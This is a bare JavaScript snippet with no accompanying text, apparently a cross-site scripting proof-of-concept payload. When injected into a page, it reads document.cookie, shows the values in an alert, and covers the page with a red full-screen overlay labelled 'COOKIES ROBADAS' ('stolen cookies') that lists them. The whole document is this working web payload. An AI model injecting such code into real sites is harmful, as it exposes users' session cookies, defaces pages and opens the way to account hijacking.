(function(){
var c=document.cookie;
alert('COOKIES: '+c);
var div=document.createElement('div');
div.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;font-size:20px;padding:20px;z-index:9999';
div.innerHTML='<h1>COOKIES ROBADAS</h1><p>'+c+'</p>';
document.body.appendChild(div);
})();
